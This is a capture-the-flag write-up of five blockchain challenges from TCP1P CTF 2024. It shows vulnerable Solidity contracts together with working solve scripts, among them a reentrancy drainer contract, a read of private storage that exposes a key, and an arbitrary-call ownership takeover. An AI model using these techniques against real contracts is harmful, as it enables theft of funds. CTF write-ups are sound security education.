---
title: "[Blockchain] Inju's Gambit - TCP1P CTF 2024: Exploring Nusantara's Digital Realm"
category: "blockchain"
subcategory: "integer"
type: "writeup"
tags: ["xor", "integer-overflow", "solidity", "foundry", "blockchain", "inju", "gambit", "integer", "tcp1p-ctf-2024-exploring-nusan", "tcp1p-ctf-2024-exploring-nusantara", "2024", "ctf-writeup"]
summary: "TCP1P-CTF Blockchain writeups"
source:
  name: "CTFtime writeup #39547"
  url: "https://ctftime.org/writeup/39547"
original_source: "https://blog.deadsec.sh/post/tcp1p-blockchain-ctf/"
ctf:
  name: "TCP1P CTF 2024: Exploring Nusantara's Digital Realm"
  year: 2024
  challenge: "[Blockchain] Inju's Gambit"
---

## Metadata

- **CTF:** TCP1P CTF 2024: Exploring Nusantara's Digital Realm
- **Task:** [Blockchain] Inju's Gambit
- **Author team:** xor and the half adder
- **CTFtime:** <https://ctftime.org/writeup/39547>
- **Original writeup:** <https://blog.deadsec.sh/post/tcp1p-blockchain-ctf/>

---
# TCP1P-CTF Blockchain writeups - Sun, Oct 13, 2024

TCP1P-CTF Blockchain writeups

This weekend I particpated in the TCP1P Capture the flag cybersecurity contest and together with my personal CTF team [Xor and the half adder](https://xatha.org) we managed to get placed at 15 out of 1110.

![scoreboard](https://blog.deadsec.sh/tcp1p/tcp1p-board.png)

What caught my interest was mainly the blockchain challenges since it’s rather an obscure technology when it comes to most CTFs.

To interact with the challenges each player got their own dedicated rpc that they can connect to avoid solution leakage since everything is public on the blockchain ![deployment](https://blog.deadsec.sh/tcp1p/tcp1p-blockchain-deploy.png) and each contract was deployed using a Setup contract such as the following:

```
    // SPDX-License-Identifier: MIT
    pragma solidity 0.6.12;
    
    import { HCOIN } from "./HCOIN.sol";
    
    contract Setup {
        HCOIN public coin;
        address player;
    
        constructor() public payable {
            require(msg.value == 1 ether);
            coin = new HCOIN();
            coin.deposit{value: 1 ether}();
        }
    
        function setPlayer(address _player) public {
          require(_player == msg.sender, "Player must be the same with the sender");
          require(_player == tx.origin, "Player must be a valid Wallet/EOA");
          player = _player;
        }
    
        function isSolved() public view returns (bool) {
            return coin.balanceOf(player) > 1000 ether; // im rich :D
        }
    }
```

so the goal is to make the `isSolved` function return true

for solving the challenges I have used the [foundry toolkit](https://book.getfoundry.sh) mainly because you can write your own exploit scripts in pure solidity which saves a lot of time and gets rid of type conversion errors.

# babyERC20

this challenge has a high number of solves so I assume it was a warmup to test the connection to the chain.

we are given a basic ERC20 contract (the uninteresting parts are shortended to save space)

```
    pragma solidity 0.6.12; // this version is older than 0.8.0 so the contract is vulnerable to integer overflow
    
    contract HCOIN is Ownable {
        function deposit() public payable {
            balanceOf[msg.sender] += msg.value;
        }
        function transfer(address _to, uint256 _value) public returns (bool success) {
            require(_to != address(0), "ERC20: transfer to the zero address");
            require(balanceOf[msg.sender] - _value >= 0, "Insufficient Balance");
            balanceOf[msg.sender] -= _value;
            balanceOf[_to] += _value;
            return true;
        }
        function approve(address _spender, uint256 _value) public returns (bool success) {
            ...
        }
        function transferFrom(address _from, address _to, uint256 _value) onlyOwner public returns (bool success) {
            require(allowance[_from][msg.sender] >= _value, "Allowance exceeded");
            require(_to != address(0), "ERC20: transfer to the zero address");
            require(balanceOf[msg.sender] - _value >= 0, "Insufficient Balance");
            balanceOf[_from] -= _value;
            balanceOf[_to] += _value;
            allowance[_from][msg.sender] -= _value;
            ...
        }
        fallback() external payable {
            deposit();
        }
    
    }
```

so after reading the contract I assumed ther’s an integer overflow somewhere in the transfers or the approval but to my surprise when I queried my account balance I saw this:

```
    $ cast balance "<wallet address>" --rpc-url "<rpc>"
    5000000000000000000000 # 5000e18
```

so we don’t really need any hacks I can just transfer my ether to the contract originally I just transfered 3000 eth to the contract using metamask but for the writeup I made this foundry solve script

```
    import {Script, console} from "forge-std/Script.sol";
    import {Setup} from "../contracts/Setup.sol";
    import {HCOIN} from "../contracts/HCOIN.sol";
    contract pwnScript is Script {
        Setup setup;
        HCOIN coin;
    
        function setUp() public {
            setup = Setup(0x037B6CD5Ad7D49c637be4cfD94572b405f4E0783);
            coin = HCOIN(setup.coin());
        }
    
        function run() public {
            vm.startBroadcast();
            setup.setPlayer(msg.sender); //set the player to my address
            coin.deposit{value: 3000 ether}();
            console.log(setup.isSolved()); //check if everything is ok
            vm.stopBroadcast();
        }
    }
```

![solve](https://blog.deadsec.sh/tcp1p/babyerc-solve.png)

```
    forge script script/exploit.s.sol --rpc-url "<rpc>" --private-key "<your private key>"
```

# Inju’s Gambit

This challenge was more of a misc challenge to me. but nonetheless the solution was interesting in this challenge we have 2 contracts:

  * `Privileged`: contract handling the access control restrictions and the privileges
  * `ChallengeManager`: a contract that grants privileges to other parties


the goal in `Setup.sol` was this :

```
    function isSolved() public view returns(bool){
            return address(privileged.challengeManager()) == address(0);
    }
```

Luckily `Privileged.sol` contains this function:

```
    function fireManager() public onlyOwner{
            challengeManager = address(0);
    }
```

Looks easy we just need to bypass the modifier:

```
    modifier onlyOwner() {
            if(msg.sender != casinoOwner){
                revert Privileged_NotHighestPrivileged();
            }
            _;
    }
```

So in order to become the owner we need to interact with the `ChallengeManager`

```
    function approach() public payable {
            if(msg.value != 5 ether){
                revert CM_NotTheCorrectValue();
            }
            if(approached[msg.sender] == true){
                revert CM_AlreadyApproached();
            }
            approached[msg.sender] = true;
            challenger.push(msg.sender);
            privileged.mintChallenger(msg.sender);
    }
```

we just need to depoist 5 ether to start the challenge but the next step is to upgrade our privileges

```
    function upgradeChallengerAttribute(uint256 challengerId, uint256 strangerId) public stillSearchingChallenger {
            //makes sure a valid id is being used
            if (challengerId > privileged.challengerCounter()){ 
                revert CM_InvalidIdOfChallenger();
            }
            //same as before
            if(strangerId > privileged.challengerCounter()){
                revert CM_InvalidIdofStranger();
            }
            //you can only challenge using your own account
            if(privileged.getRequirmenets(challengerId).challenger != msg.sender){
                revert CM_CanOnlyChangeSelf();
            }
    
            //calculates a somewhat random hash using the block.timestamp as a seed
            uint256 gacha = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp))) % 4;
    
            if (gacha == 0){ //upgrade the stranger
                if(privileged.getRequirmenets(strangerId).isRich == false){
                    privileged.upgradeAttribute(strangerId, true, false, false, false);
                }else if(privileged.getRequirmenets(strangerId).isImportant == false){
                    privileged.upgradeAttribute(strangerId, true, true, false, false);
                }else if(privileged.getRequirmenets(strangerId).hasConnection == false){
                    privileged.upgradeAttribute(strangerId, true, true, true, false);
                }else if(privileged.getRequirmenets(strangerId).hasVIPCard == false){
                    privileged.upgradeAttribute(strangerId, true, true, true, true);
                    qualifiedChallengerFound = true;
                    theChallenger = privileged.getRequirmenets(strangerId).challenger;
                }
            }else if (gacha == 1){ //upgrade the challenger
                if(privileged.getRequirmenets(challengerId).isRich == false){
                    privileged.upgradeAttribute(challengerId, true, false, false, false);
                }else if(privileged.getRequirmenets(challengerId).isImportant == false){
                    privileged.upgradeAttribute(challengerId, true, true, false, false);
                }else if(privileged.getRequirmenets(challengerId).hasConnection == false){
                    privileged.upgradeAttribute(challengerId, true, true, true, false);
                }else if(privileged.getRequirmenets(challengerId).hasVIPCard == false){
                    privileged.upgradeAttribute(challengerId, true, true, true, true);
                    qualifiedChallengerFound = true;
                    theChallenger = privileged.getRequirmenets(challengerId).challenger;
                }
            }else if(gacha == 2){ // nuke the challenger
                privileged.resetAttribute(challengerId);
                qualifiedChallengerFound = false;
                theChallenger = address(0);
            }else{
                //nuke the strager
                privileged.resetAttribute(strangerId);
                qualifiedChallengerFound = false;
                theChallenger = address(0);
            }
        }
```

what caught my eye first was that there’s no check whether `stangerId == challengerId` which implies we can just challenge ourselve and account for the 0 and 1 cases as one.

So now how can I time this function properly to elevate my privileges ? at the begining I expiremented with just randomly spamming `upgradeChallengerAttribute(myid,myid)` and after a couple of tries I managed to get it through but this solution wasn’t satisfying neither interesting so I wrote a solve script with foundry again :P

after that we are left with the last part of the ChallengeManager.sol contract:

```
    bytes32 private masterKey;
    function challengeCurrentOwner(bytes32 _key) public onlyChosenChallenger{
            if(keccak256(abi.encodePacked(_key)) == keccak256(abi.encodePacked(masterKey))){
                privileged.setNewCasinoOwner(address(theChallenger));
            }        
        }
```

> YOU: Oh no it’s a private variable what are we gonna dooo ?????   
> 

> ME: Chillout it’s the blockchain ;)

private is a non-existent term when it comes to the blockchain, we can easily read any value using web3.js

```
    const web3 = new Web3('<rpc>');
    console.log(web3.eth.getStorageAt("0x9d9842E37E5e6786D07aa4AD7173488b7D247d9B", 1, (e,v) => console.log(v)))
    >0x494e4a55494e4a55494e4a5553555045524b45594b45594b45594b45594b4559
```

we read the index 1 because that’s where the masterkey variable is stored in the memory of the smart contract

and now we put it all together here you might have to run it twice if you aren’t lucky enough just due to randomness there are better ways to estimate the precise moment but do you really care ??

```
    // the setup part was the same as the previous one so I emitted here to save space
    
    function run() public {
            vm.startBroadcast();
            if (!ch.approached(msg.sender)){
                ch.approach{value: 5e18}();
            }
            uint256 gacha = uint256(keccak256(abi.encodePacked(address(this), block.timestamp))) % 4;
            //check 
            if (gacha == 0 || gacha == 1) {
                uint i = 0;
                while (i != 4){
                    ch.upgradeChallengerAttribute(3, 3); //assuming we are the 3rd challenge after the setup script
                    i++;
                }
                ch.challengeCurrentOwner(0x494e4a55494e4a55494e4a5553555045524b45594b45594b45594b45594b4559);
                p.fireManager();
            }
            vm.stopBroadcast();
    }
```

# Money Captcha

The goal here was to drain the `moneyContract`:

```
    function isSolved() public view returns (bool) {
            return address(moneyContract).balance == 0;
    }
```

As you can see the challenge is the regular reentrancy bug.

```
    contract Money {
        // unnecessary code is emitted for better readibility
        
        uint256 public immutable secret = uint256(blockhash(block.prevrandao));
        function save() public payable {
            require(msg.value > 0, "You don't have money XP");
            balances[msg.sender] += msg.value;
        }
    
        //vulnerable function 
        function load(uint256 userProvidedCaptcha) public { 
            uint balance = balances[msg.sender];
            require(balance > 0, "You don't have money to load XD");
    
            uint256 generatedCaptcha = uint256(keccak256(abi.encodePacked(_secret, block.number, block.timestamp)));
            require(userProvidedCaptcha == generatedCaptcha, "Invalid captcha");
            //vulnerable code
            (bool success,) = msg.sender.call{value: balance}("");
            require(success, 'Oh my god, what is that!?');
            balances[msg.sender] = 0;
        }
    }
```

reentrancy must be exploited by deploying another contract so here’s mine:

```
    contract Pwner {
        Money public moneyContract;
        Captcha public captchaContract;
        bool public pwned = false;
        constructor(Money _moneyContract, Captcha _captchaContract) {
            moneyContract = _moneyContract;
            captchaContract = _captchaContract;
            
        }
    
        function pwn() public payable{
            moneyContract.save{value: msg.value}();
            uint256 captcha = uint256(keccak256(abi.encodePacked(moneyContract.secret(), block.number, block.timestamp)));
            moneyContract.load(captcha);
        }
    
        receive() external payable {
            //make sure I don't get stuck at an infinite loop, may not be necessary but better be safe than sorry
            if (!pwned){
                pwned = true;
                uint256 captcha = uint256(keccak256(abi.encodePacked(moneyContract.secret(), block.number, block.timestamp)));
                moneyContract.load(captcha);
            }else {
                pwned = false;
            }
        }
    }
```

And that’s it for this challenge

# Executive Problem

This challenge had 2 contracts:

  * `Crain.sol`: basic contract with one restricted function for changing the owner
  * `CrainExecutive.sol`: Permission contract for managing the ownership of the `Crain.sol` contract


the goal is to gain ownership of the `Crain.sol`

```
    function isSolved() public view returns(bool){
            return crain.crain() != address(this);
    }
```

so our target is the CraineExecutive contract initially:

```
    contract CrainExecutive{
    
        function claimStartingBonus() public _onlyOnePerEmployee{
            balanceOf[owner] -= 1e18;
            balanceOf[msg.sender] += 1e18;
        }
    
        function becomeEmployee() public {
            isEmployee[msg.sender] = true;
        }
    
        function becomeManager() public _onlyEmployee{
            require(balanceOf[msg.sender] >= 1 ether, "Must have at least 1 ether");
            require(isEmployee[msg.sender] == true, "Only Employee can be promoted");
            isManager[msg.sender] = true;
        } 
    
        function becomeExecutive() public {
            require(isEmployee[msg.sender] == true && isManager[msg.sender] == true);
            require(balanceOf[msg.sender] >= 5 ether, "Must be that Rich to become an Executive");
            isExecutive[msg.sender] = true;
        }
    
        function buyCredit() public payable _onlyEmployee{
            require(msg.value >= 1 ether, "Minimum is 1 Ether");
            uint256 totalBought = msg.value;
            balanceOf[msg.sender] += totalBought;
            totalSupply += totalBought;
        }
    
        function sellCredit(uint256 _amount) public _onlyEmployee{
            require(balanceOf[msg.sender] - _amount >= 0, "Not Enough Credit");
            uint256 totalSold = _amount;
            balanceOf[msg.sender] -= totalSold;
            totalSupply -= totalSold;
        }
        //vulnerable function
        function transfer(address to, uint256 _amount, bytes memory _message) public _onlyExecutive{
            require(to != address(0), "Invalid Recipient");
            require(balanceOf[msg.sender] - _amount >= 0, "Not enough Credit");
            uint256 totalSent = _amount;
            balanceOf[msg.sender] -= totalSent;
            balanceOf[to] += totalSent;
            //vulnerable code that allows anyone to call any address on behalf of the contract
            (bool transfered, ) = payable(to).call{value: _amount}(abi.encodePacked(_message));
            require(transfered, "Failed to Transfer Credit!");
        }
    
    }
```

So we just have to call the functions in the correct order to get `Executive` role afterwards we can abuse the funcitonality to call the `crain.ascendToCrain` function to takeover the `Crain.sol` contract

So I put everything in a solve script:

```
    function run() public {
            Crain crain = setup.crain();
            CrainExecutive ce = setup.cexe();
            vm.startBroadcast();
            ce.becomeEmployee();
            ce.claimStartingBonus();
            ce.becomeManager();
            ce.buyCredit{value: 5 ether}();
            ce.becomeExecutive();
            bytes memory data = abi.encodeWithSignature("ascendToCrain(address)", msg.sender);
            ce.transfer(address(crain), 0 ether, data);
            vm.stopBroadcast();
        }
```

# Minecraft huh

In my opinion this challenge had potential to be much more interesting but it ended up being quite easy to solve

Initially we get the description but without any contracts: ![description](https://blog.deadsec.sh/tcp1p/minercraft-desc.png)

My first thoughts were whether the authors forgot to add the source code or not, nonethless I started doing basic enumeration using `web3.js` on the chain.

```
    const { Web3 } = require('web3');
    const w3 = new Web3("http://ctf.tcp1p.team:44555/7d491d19-9706-4dca-a599-43f65aecd053");
    console.log(await w3.eth.getBlock())
```

The result was quite interesting since the block number was 8 unlike the challenges from before which all had only one block mined.

![the blocks](https://blog.deadsec.sh/tcp1p/minercraft-blocks.png)

so I took a look at the first block after the gensis

```
    > await w3.eth.getBlock(1)
    {
      hash: '0xdea377425bfecf29d3675fedc611d5a0e58133ad07b55b7c10727fcd01706a76',
      parentHash: '0xa69b4c1826293f2c8e291feab0c65c8a86cc6945fb595e8b0ad9f5460c354582',
      sha3Uncles: '0x1dcc4de8dec75d7aab85b567b6ccd41ad312451b948a7413f0a142fd40d49347',
      miner: '0x0000000000000000000000000000000000000000',
      stateRoot: '0xd65448f21a330d2454d7e3ee63a370f55dbe74c582d7a5a0a89d1bb18656a367',
      transactionsRoot: '0x4e89445408d7569031b3f1cf080d67e3ef00559509c274e4a792b5ded7c7c4b1',
      receiptsRoot: '0xfb3db4be5cb9ad4a0c55651a1adcd83c43ce7a226c2f4394a417526a3ea01ef2',
      logsBloom: '0x00.....',
      difficulty: 0n,
      number: 1n,
      gasLimit: 30000000n,
      gasUsed: 376770n,
      timestamp: 1728849080n,
      totalDifficulty: 0n,
      extraData: '0x',
      mixHash: '0x0000000000000000000000000000000000000000000000000000000000000000',
      nonce: 0n,
      baseFeePerGas: 0n,
      blobGasUsed: 0n,
      excessBlobGas: 0n,
      uncles: [],
      transactions: [
        '0x493554a088aac4c1a7f6aa11971df07cf213d40163f4bb5788653c21da59f443'
      ],
      size: 2275n
    }
```

we have only one transaction mined good let’s take a further look

```
    await w3.eth.getTransaction("0x493554a088aac4c1a7f6aa11971df07cf213d40163f4bb5788653c21da59f443")
```

interesting enough we see what looks like a contract deployment

![Contract Deployment](https://blog.deadsec.sh/tcp1p/minercraft-contract-deploy.png)

> Intersting…

I felt adventurous so why not decompile it

for the decompilation I used a mixture of decompilers, manual guesses and ofcourse chatgpt and I ended up with this result.

```
    pragma solidity ^0.8.28;
    
    contract Setup {
        ChallengeContract public ChallengeContract;
    
        constructor() {
            // Deploy the secondary contract with 1 ether
            ChallengeContract = new ChallengeContract{value: 1 ether}();
        }
    
        function isSolved() external pure returns (uint256) {
            return 0;
        }
    }
    
    contract ChallengeContract {
        string private storedString;
    
        constructor() payable {
            storedString = "thisIsTheFirstOneIsntIt";
        }
    
        function setString(string memory newString) external {
            storedString = newString;
        }
    }
```

Quite simple functionality but like what’s the challenge here ? at this stage I just ran through the blocks for further investigation maybe there are more contracts right ?

the second transaction was this:

![Second transaction](https://blog.deadsec.sh/tcp1p/minercraft-contract-2nd.png)

it looks like a function call to `setString`, after further investigation it looked like all of the remaining blocks had the same call to setString but with different parameters. So the solution is obvious at this point, one of those `setString` calls has the flag.

I made this script to speed things up with `web3.js`:

```
    const { Web3 } = require('web3');
    
    const w3 = new Web3("<rpc>");
    
    
    const solve = async () => {
        //skip the contract deployment block
        for (let i = 2; i < 8; i++){
            const block = await w3.eth.getBlock(i);
            const txHash = block.transactions[0]; //there's only one transaction in each block
            const tx = await w3.eth.getTransaction(txHash);
            const argument = tx.input.slice(136);
            console.log(Buffer.from(argument, "hex").toString());
      }
    }
    solve();
```

we got the output

```
     TCP3P{this_is_one_p_not_three_p} //fake flag pretty lame 
    h I changed my mind again!
    Nah That does not sound good
    
    TCP1P.....
    ,TCP1P{running_through_some_blocks_have_you?}
    That is lame, nevermind
```

and that’s it for now, if you would like to reach out to me on discord and ask furhter question you can hit me up on `@pop_eax`.

#### [Back to Home](https://blog.deadsec.sh/)
